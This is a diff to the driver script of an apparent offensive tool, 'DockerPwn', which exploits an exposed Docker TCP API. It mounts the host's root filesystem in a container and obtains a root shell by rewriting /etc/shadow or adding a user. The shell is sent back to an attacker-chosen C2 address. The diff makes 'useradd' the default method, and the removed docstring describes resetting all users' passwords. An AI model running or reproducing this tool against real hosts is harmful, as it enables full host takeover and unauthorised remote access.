@@ -1,30 +1,13 @@
 #/usr/bin/python3
 
 '''
-Exploit for exposed Docker TCP Socket.
+Automation for abusing an exposed Docker TCP Socket.
 
-This will automatically create a container on the Docker host with the root filesystem mounted,
-allowing arbitrary read and write of the root filesystem (which is bad).
+This will automatically create a container on the Docker host with the host's root filesystem mounted,
+allowing arbitrary read and write of the host filesystem (which is bad).
 
-Once created, the script will empty the password requirement for 'root', and will alter any user
-with a valid Unix password to have a password of 'DockerPwn'
-
-Once this is done, the script will attempt to use Paramiko to login to all users enumerated from 
-/etc/passwd using the password 'DockerPwn', and a shell will be spawned. 
-
-Roadmap:
-
-Utilize the limited command execution via Paramiko to get a better shell, and automatically escalate to root.
-
-
-Usage:
-
-DockerPwn.py [-h] [--target TARGET] [--port PORT]
-
-optional arguments:
-  -h, --help       show this help message and exit
-  --target TARGET  IP of Docker Host
-  --port PORT      Docker API TCP Port
+Once created, the script will employ the method of your choosing for obtaining a root shell. Currently,
+shadow and useradd are working, with the less destructive method 'useradd' being default. 
 
 '''
 
@@ -32,6 +15,7 @@ import argparse
 import sys
 import createContainer
 import shadowPwn
+import useradd
 import shellHandler
 from subprocess import Popen
 import threading
@@ -42,7 +26,7 @@ def main():
     parser.add_argument("--target", help="IP of Docker Host", type=str)
     parser.add_argument("--port", help="Docker API TCP Port", type=int)
     parser.add_argument("--image", help="Docker image to use. Default is Alpine Linux.", type=str)
-    parser.add_argument("--method", help="Method to use. Valid methods are shadow, chroot, binary. Default is shadow.", type=str)
+    parser.add_argument("--method", help="Method to use. Valid methods are shadow, chroot, useradd. Default is useradd.", type=str)
     parser.add_argument("--c2", help="Local IP and port in [IP]:[PORT] format to receive the shell.", type=str)
     args = parser.parse_args()
     target = args.target
@@ -57,15 +41,16 @@ def main():
             image = 'alpine'
 
         containerID = createContainer.create(target, port, image)
+        
+        if method is None or method == 'useradd':
+            useradd.attack(target, port, containerID, c2)
+            shellHandler.listen(c2, method)
 
-        if method is None or method == 'shadow':
+        elif method == 'shadow':
             shadowPwn.attack(target, port, containerID, c2)
-            shellHandler.listen(c2)
+            shellHandler.listen(c2, method)
 
        # elif method == 'chroot':
-            #chrootPwn.attack(target, port, containerID)
-
-       # elif method == 'binary':
             #binPwn.attack(target, port, containerID)
 
     else:
